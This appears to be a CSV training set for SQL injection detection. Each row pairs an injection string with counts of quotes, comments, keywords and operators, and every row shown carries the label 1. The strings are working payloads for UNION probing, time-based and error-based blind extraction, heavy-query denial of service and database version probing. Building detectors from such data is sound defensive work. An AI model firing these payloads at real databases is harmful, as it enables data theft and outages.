Query,Data,Singlequotes,Doublequotes,Punctuations,1-linecmt,Mulline-cmt,Spaces,Safekywrd,Harmflkywrd,Percentages,Log_oprtr,Operator,Nulls,Hex-dec,Db_info,Roles,Ntwr_cmds,Lang_cmds,Alphabets,Digits,Spl_char,Label
if  (  8264  =  1939  )   select 8264 else drop function nsoq--,0,0,0,4,0,0,12,1,1,0,0,3,0,0,0,0,0,2,28,12,0,1
"1""  )   where 4822  =  4822 union all select null,null,null,null,null,null,null,null,null,null--",0,0,1,13,0,0,10,4,0,0,1,4,10,0,0,0,0,1,59,9,1,1
"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbb""  =  ""jzbb",0,0,4,25,0,0,39,2,2,0,2,4,0,3,0,0,0,1,77,37,4,1
1   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   4279  =  4279,0,0,0,10,0,0,27,3,1,0,3,5,0,1,0,0,0,1,34,21,0,1
1' where 5455  =  5455 and sleep  (  5  )  --,0,1,0,5,0,0,11,1,1,0,2,5,0,0,0,0,1,0,13,10,1,1
1'   )    )    as dago where 9788  =  9788,0,1,0,3,0,0,9,0,1,0,0,1,0,0,0,0,0,0,11,9,1,1
1  )   as mtnw where 7293  =  7293 and 2603  =  5764--,0,0,0,3,0,0,12,1,1,0,2,6,0,0,0,0,0,0,14,17,0,1
"1' in boolean mode  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #",0,1,0,11,0,0,24,3,3,0,2,4,0,0,0,0,0,1,84,8,1,1
"1'||  (  select 'uusj' where 2149  =  2149 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",0,6,0,17,0,0,26,4,1,0,4,11,0,0,0,0,0,1,46,23,6,1
"1'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   'qeet'  =  'qeet",0,4,0,44,0,0,75,3,8,0,3,15,2,0,0,0,0,1,115,35,4,1
1 and 9198  =  9198--,0,0,0,2,0,0,5,1,0,0,2,5,0,0,0,0,0,0,3,9,0,1
-3496'   )    )    or 9323  =  9323#,0,1,0,4,0,0,7,1,0,0,1,3,0,0,0,0,0,0,2,12,1,1
 (  select   (  case when   (  9066  =  5598  )   then 1 else 9066*  (  select 9066 from information_schema.character_sets  )   end   )    ) ,0,0,0,9,0,0,23,7,2,0,2,4,0,0,0,0,0,2,65,17,0,1
"1'   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'gucd'  =  'gucd",0,4,0,20,0,0,37,3,7,0,3,6,0,0,0,7,0,1,119,12,4,1
"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'yznd' like 'yznd",0,4,0,11,0,0,17,3,1,0,4,5,0,0,0,0,1,0,25,10,4,1
"-6870""  )   as deox where 8198  =  8198 union all select 8198#",0,0,1,3,0,0,12,4,1,0,1,3,0,0,0,0,0,1,25,16,1,1
"-6407'  )   or elt  (  1631  =  4946,4946  )   and   (  'jpnz'  =  'jpnz",0,4,0,10,0,0,14,2,0,0,3,6,0,0,0,0,0,0,16,16,4,1
"1  )   as jvuo where 6859  =  6859 union all select null,null,null,null,null,null,null#",0,0,0,7,0,0,12,4,1,0,1,2,7,0,0,0,0,1,53,9,0,1
"1""  )   where 1705  =  1705",0,0,1,2,0,0,6,0,0,0,0,1,0,0,0,0,0,0,5,9,1,1
"1"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  ",0,0,1,35,0,0,72,2,3,0,2,24,0,0,0,0,0,1,75,45,1,1
select,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,6,0,0,1
"1%""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""%""  =  """,0,0,4,15,0,0,24,3,0,2,4,9,0,0,0,0,0,1,35,13,4,1
-5555   )    )    as ldte where 4583  =  4583 order by 1#,0,0,0,3,0,0,12,2,1,0,1,3,0,0,0,0,0,0,18,13,0,1
"-9987   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  2114  =  2114",0,0,0,40,0,0,80,3,1,0,3,27,0,0,0,0,0,1,83,60,0,1
"1%""   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """,0,0,4,41,0,0,78,3,1,2,4,29,0,0,0,0,0,1,84,49,4,1
"1%'  )   union all select null,null,null,null,null,null,null,null,null,null#",0,1,0,11,0,0,6,4,0,1,1,2,10,0,0,0,0,1,54,1,1,1
"1%'   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",0,1,0,16,0,0,31,2,7,1,2,7,0,0,0,7,0,1,109,12,1,1
"1' in boolean mode  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  #",0,1,0,18,0,0,27,4,1,0,2,3,0,3,0,0,0,2,46,39,1,1
-7758%'   )    )     )   or 3038  =  3038,0,1,0,5,0,0,8,1,0,1,1,4,0,0,0,0,0,0,2,12,1,1
end and   (  'unko'  =  'unko,0,3,0,4,0,0,6,1,0,0,2,3,0,0,0,0,0,0,14,0,3,1
"1 union all select null,null,null,null,null,null--",0,0,0,7,0,0,5,4,0,0,1,3,6,0,0,0,0,1,38,1,0,1
"1%'   )    )     )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",0,1,0,18,0,0,28,1,0,1,2,12,0,0,0,0,0,0,37,15,1,1
1'||  (  select 'bsbv' from dual where 5276  =  5276 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   ||',0,4,0,14,0,0,28,4,1,0,1,7,0,0,0,0,1,3,50,10,4,1
1 where 4785  =  4785 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,0,0,0,33,0,0,74,2,2,0,2,27,0,0,0,0,0,1,96,53,0,1
"-5313'  )   union all select 7187,7187,7187#",0,1,0,5,0,0,6,4,0,0,1,2,0,0,0,0,0,1,14,16,1,1
"1%'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  '",0,4,0,43,0,0,80,3,1,2,4,29,0,0,0,0,0,1,84,49,4,1
"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",0,4,0,40,0,0,71,4,8,0,4,15,2,0,0,0,0,1,119,35,4,1
1  )   as sdnd where 9472  =  9472,0,0,0,1,0,0,8,0,1,0,0,1,0,0,0,0,0,0,11,9,0,1
select * from users where id  =  '1' or \<$ or 1  =  1 -- 1',0,3,0,5,1,0,16,3,0,0,2,8,0,0,0,1,0,1,26,4,4,1
select sleep  (  5  )   and 'mlmu'  =  'mlmu,0,3,0,5,0,0,9,2,1,0,2,3,0,0,0,0,1,1,22,1,3,1
-8378%'  )   union all select 5491#,0,1,0,3,0,0,6,4,0,1,1,3,0,0,0,0,0,1,14,8,1,1
1'  )   where 2974  =  2974 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,0,1,0,33,0,0,73,3,1,0,3,28,0,0,0,0,0,1,94,53,1,1
select sleep  (  5  )   and   (  'hhlq' like 'hhlq,0,3,0,6,0,0,10,3,1,0,3,3,0,0,0,0,1,1,26,1,3,1
"-1591 where 3291  =  3291 union all select 3291,3291,3291,3291,3291,3291,3291,3291,3291#",0,0,0,9,0,0,9,4,0,0,1,3,0,0,0,0,0,1,19,48,0,1
"1"" and sleep  (  5  )  ",0,0,1,3,0,0,6,1,1,0,2,2,0,0,0,0,1,0,8,2,1,1
"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",0,0,1,8,0,0,17,1,1,0,2,6,0,0,0,0,0,0,17,21,1,1
"1""   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""nevr"" like ""nevr",0,2,4,21,0,0,27,5,1,0,7,9,0,0,0,0,0,0,46,15,6,1
"1'   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",0,1,0,17,0,0,27,1,0,0,1,10,0,0,0,0,0,0,36,16,1,1
" select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",0,0,2,4,1,0,16,3,0,0,2,7,0,0,0,1,0,1,26,4,2,1
"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '%'  =  '",0,4,0,21,0,0,35,2,2,2,2,6,0,3,0,0,0,1,69,37,4,1
"1"" or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and ""dtwv"" like ""dtwv",0,0,4,23,0,0,39,4,5,0,5,12,1,0,0,0,0,0,67,24,4,1
waitfor delay '0:0:5',0,2,0,4,0,0,3,1,1,0,1,1,0,0,0,0,1,0,12,3,2,1
"1%"" and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""%""  =  """,0,2,4,15,0,0,21,4,1,2,7,12,0,0,0,0,0,0,35,15,6,1
1   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  4574  =  4574,0,0,0,14,0,0,27,4,1,0,3,5,0,0,0,0,1,2,33,10,0,1
select * from users where id  =  '1' <@&@ or 1  =  1 -- 1',0,3,0,5,1,0,15,2,0,0,1,8,0,0,0,1,0,1,24,4,3,1
"1  )   union all select null,null,null,null#",0,0,0,4,0,0,6,4,0,0,1,1,4,0,0,0,0,1,30,1,0,1
"-3672""   )    )    union all select 6093#",0,0,1,4,0,0,7,4,0,0,1,2,0,0,0,0,0,1,14,8,1,1
"  (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6130  =  6130,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",0,0,0,24,0,0,37,4,1,0,0,3,0,3,0,0,0,4,46,70,0,1
"1'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'kpsg' like 'kpsg",0,4,0,36,0,0,57,4,7,0,6,17,2,0,0,0,0,0,87,27,4,1
1'   )    )    as xcvg where 1157  =  1157 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,0,1,0,11,0,0,28,2,2,0,1,5,0,1,0,0,0,1,42,21,1,1
"-5207  )   where 6987  =  6987 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",0,0,0,39,0,0,81,4,14,0,2,18,0,0,0,0,0,2,96,58,0,1
1' where 5335  =  5335,0,1,0,1,0,0,5,0,0,0,0,1,0,0,0,0,0,0,5,9,1,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'squj'  =  'squj",0,3,0,13,0,0,20,2,3,0,2,4,0,0,0,0,0,1,80,3,3,1
"-5275%'   )    )    union all select 9382,9382,9382,9382,9382,9382,9382,9382,9382,9382--",0,1,0,15,0,0,7,4,0,1,1,5,0,0,0,0,0,1,14,44,1,1
"1""  )   where 3507  =  3507",0,0,1,2,0,0,6,0,0,0,0,1,0,0,0,0,0,0,5,9,1,1
"-2325'   )    )     )   union all select 1442,1442,1442--",0,1,0,9,0,0,8,4,0,0,1,4,0,0,0,0,0,1,14,16,1,1
"1'  )   as zxho where 5907  =  5907 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",0,3,0,15,0,0,25,3,2,0,4,9,0,0,0,0,0,0,42,23,3,1
1'||  (  select 'etvo' from dual where 1557  =  1557,0,3,0,4,0,0,10,1,0,0,0,3,0,0,0,0,0,1,23,9,3,1
select case when 1613  =  2937 then 1 else null end--,0,0,0,2,0,0,11,1,1,0,0,3,1,0,0,0,0,1,29,9,0,1
"1'  )   union all select null,null,null,null#",0,1,0,5,0,0,6,4,0,0,1,1,4,0,0,0,0,1,30,1,1,1
"1""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""njdu"" like ""njdu",0,0,4,30,0,0,50,14,2,0,9,12,0,2,0,0,0,3,111,35,4,1
select pg_sleep  (  5  )   and   (  'aydg'  =  'aydg,0,3,0,6,0,0,10,2,1,0,2,3,0,0,0,0,1,1,24,1,3,1
1' and 1  =    (  select count  (  *  )   from tablenames  )  ; --,0,1,0,8,0,0,15,2,0,0,2,6,0,0,0,0,0,1,28,2,1,1
1'  )   and sleep  (  5  )  #,0,1,0,4,0,0,8,1,1,0,2,2,0,0,0,0,1,0,8,2,1,1
"1'||  (  select 'odud' from dual where 2468  =  2468 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",0,3,0,13,0,0,31,3,4,0,1,8,0,0,0,0,0,2,94,17,3,1
"1%""   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",0,0,1,13,0,0,20,2,0,1,2,7,0,0,0,0,0,1,32,13,1,1
1%'   )    )     )   rlike sleep  (  5  )   and    (    (     (  '%'  =  ',0,4,0,12,0,0,16,2,1,2,3,6,0,0,0,0,1,0,13,2,4,1
" select * from users where id  =  1 union select @<@.,version  (    )   -- 1",0,0,0,6,1,0,15,4,1,0,0,5,0,0,0,1,0,2,40,2,0,1
"1%'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   '%'  =  '",0,4,0,23,0,0,29,3,1,2,4,8,0,3,0,0,0,1,40,35,4,1
1  )   where 6950  =  6950 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,0,0,0,11,0,0,23,3,1,0,1,5,0,0,0,0,1,2,35,10,0,1
"1  )   as clye where 7842  =  7842 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",0,0,0,22,0,0,43,2,6,0,3,13,1,0,0,0,0,0,64,33,0,1
1%'  )   rlike   (  select   (  case when   (  1210  =  8664  )   then 1 else 0x28 end   )    )    and   (  '%'  =  ',0,4,0,12,0,0,25,3,1,2,3,7,0,1,0,0,0,1,34,13,4,1
1  )   where 1487  =  1487,0,0,0,1,0,0,6,0,0,0,0,1,0,0,0,0,0,0,5,9,0,1
"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'gxgi'  =  'gxgi",0,4,0,27,0,0,43,3,5,0,4,12,1,0,0,0,0,0,63,24,4,1
"1""  )   and   (  5452  =  6050  )  *6050 and   (  ""ciyc"" like ""ciyc",0,0,4,8,0,0,14,3,0,0,5,7,0,0,0,0,0,0,18,13,4,1
"1 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",0,0,0,14,0,0,25,1,0,0,1,10,0,0,0,0,0,0,36,16,0,1
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240",0,0,0,7,0,0,16,2,0,0,2,4,0,0,0,0,0,1,32,16,0,1
1 where 9620  =  9620 waitfor delay '0:0:5'--,0,2,0,6,0,0,8,1,1,0,1,4,0,0,0,0,1,0,17,12,2,1
   )    )   ;waitfor delay '0:0:__TIME__'--,0,2,0,9,0,0,5,1,1,0,1,3,0,0,0,0,1,0,16,2,2,1
select   (  case when   (  3325  =  1767  )   then 3325 else 3325*  (  select 3325 from mysql.db  )   end  )  #,0,0,0,7,0,0,22,2,1,0,0,2,0,0,0,0,0,2,42,20,0,1
"1""   )    )     )   union all select null,null,null,null,null--",0,0,1,10,0,0,8,4,0,0,1,3,5,0,0,0,0,1,34,1,1,1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  5432  =  5432",0,0,0,9,0,0,19,7,0,0,7,9,0,0,0,5,0,1,63,13,0,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'kiex'  =  'kiex",0,3,0,10,0,0,17,2,3,0,2,4,0,0,0,0,0,1,80,3,3,1
"1"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",0,0,1,9,0,0,18,7,0,0,7,9,0,0,0,5,0,1,63,10,1,1
waitfor delay '0:0:5' and 'gsvt'  =  'gsvt,0,5,0,7,0,0,7,2,1,0,3,4,0,0,0,0,1,0,23,3,5,1
"-7637"" union all select 8498,8498,8498--",0,0,1,6,0,0,5,4,0,0,1,4,0,0,0,0,0,1,14,16,1,1
"select * from generate_series  (  7667,7667,case when   (  7667  =  8232  )   then 1 else 0 end  )   limit 1--",0,0,0,8,0,0,20,1,1,0,0,4,0,0,0,0,0,1,48,19,0,1
" select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",0,0,2,6,1,0,20,3,0,0,2,8,0,0,0,1,0,1,26,5,2,1
"1%"" order by 1#",0,0,1,1,0,0,4,2,0,1,1,2,0,0,0,0,0,0,7,2,1,1
-2372' or 1783  =  2656,0,1,0,2,0,0,5,1,0,0,1,3,0,0,0,0,0,0,2,12,1,1
"1  )   where 5309  =  5309 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",0,0,0,10,0,0,27,2,4,0,1,6,0,0,0,0,0,1,76,17,0,1
"1'||  (  select 'xasp' from dual where 4025  =  4025 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",0,4,0,24,0,0,42,5,2,0,2,9,0,3,0,0,0,4,67,40,4,1
"1""   )    )    as bbkl where 5686  =  5686",0,0,1,3,0,0,9,0,1,0,0,1,0,0,0,0,0,0,11,9,1,1
"1"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""epxq"" like ""epxq",0,0,4,12,0,0,22,9,0,0,10,12,0,0,0,5,0,1,78,10,4,1
1  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  4703  =  4703,0,0,0,36,0,0,78,4,13,0,5,17,0,0,0,0,0,1,81,55,0,1
"-3498""   )    )    as xbvb where 2056  =  2056 union all select 2056,2056,2056,2056,2056,2056,2056--",0,0,1,12,0,0,13,4,1,0,1,5,0,0,0,0,0,1,25,40,1,1
"1""  )   where 7514  =  7514",0,0,1,2,0,0,6,0,0,0,0,1,0,0,0,0,0,0,5,9,1,1
"1  )   where 9724  =  9724 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",0,0,0,22,0,0,41,2,5,0,2,12,1,0,0,0,0,0,57,32,0,1
"1""  )   where 1807  =  1807",0,0,1,2,0,0,6,0,0,0,0,1,0,0,0,0,0,0,5,9,1,1
1  )   as gbtj where 8175  =  8175,0,0,0,1,0,0,8,0,1,0,0,1,0,0,0,0,0,0,11,9,0,1
"1""   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""atlz""  =  ""atlz",0,0,4,17,0,0,31,3,4,0,3,6,0,0,0,0,0,1,82,9,4,1
1   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  3332  =  3332,0,0,0,14,0,0,27,4,1,0,3,5,0,0,0,0,1,2,30,10,0,1
declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,0,0,0,6,0,0,11,1,2,0,0,1,0,1,0,0,0,1,24,10,0,1
"1%"" union all select null,null,null,null,null,null#",0,0,1,6,0,0,5,4,0,1,1,2,6,0,0,0,0,1,38,1,1,1
"1""  )   where 3084  =  3084 union all select null,null--",0,0,1,5,0,0,10,4,0,0,1,4,2,0,0,0,0,1,27,9,1,1
"-1874""  )   as wgpj where 6481  =  6481 or 3629  =  3459",0,0,1,3,0,0,12,1,1,0,1,4,0,0,0,0,0,0,13,20,1,1
"1""  )   as lgxc where 1117  =  1117 union all select null,null,null,null,null,null,null,null#",0,0,1,9,0,0,12,4,1,0,1,2,8,0,0,0,0,1,57,9,1,1
select case when 9848  =  2618 then 1 else null end--,0,0,0,2,0,0,11,1,1,0,0,3,1,0,0,0,0,1,29,9,0,1
"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'aduc'  =  'aduc",0,4,0,36,0,0,66,17,1,0,6,11,0,2,0,0,0,6,109,55,4,1
"1%' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and '%'  =  '",0,4,0,28,0,0,43,6,1,2,3,9,0,3,0,0,0,4,51,71,4,1
"1%""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  ""%""  =  """,0,0,4,18,0,0,27,4,1,2,4,8,0,0,0,0,1,2,31,2,4,1
"1"" where 2035  =  2035 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",0,0,1,8,0,0,16,1,0,0,2,6,0,1,0,0,0,0,20,30,1,1
" select * from users where id  =  1 or @#""  (    =  1 or 1  =  1 -- 1",0,0,1,4,1,0,19,3,0,0,2,8,0,0,0,1,0,1,26,5,1,1
"-5385"" union all select 4577,4577,4577,4577,4577,4577,4577#",0,0,1,8,0,0,5,4,0,0,1,2,0,0,0,0,0,1,14,32,1,1
"-5438""  )   union all select 3170,3170--",0,0,1,6,0,0,6,4,0,0,1,4,0,0,0,0,0,1,14,12,1,1
"1'   )    )    union all select null,null--",0,1,0,6,0,0,7,4,0,0,1,3,2,0,0,0,0,1,22,1,1,1
"-3037""   )    )     )   or elt  (  4758  =  9129,9129  )   and    (    (     (  ""zewv"" like ""zewv",0,0,4,14,0,0,18,3,0,0,4,6,0,0,0,0,0,0,20,16,4,1
"1%""   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""%""  =  """,0,0,4,17,0,0,31,3,4,2,3,8,0,0,0,0,0,1,74,9,4,1
 union   (  select @@version  )   --,0,0,0,4,0,0,6,3,1,0,0,2,0,0,1,0,0,1,18,0,0,1
"1%""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""%""  =  """,0,0,4,18,0,0,30,2,0,2,4,14,0,0,0,0,0,0,40,16,4,1
1'  )   and   (  7603  =  3634  )  *3634,0,1,0,4,0,0,9,1,0,0,2,4,0,0,0,0,0,0,3,13,1,1
"1%"" or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,0,1,29,0,0,48,2,7,1,2,16,2,0,0,0,0,0,71,25,1,1
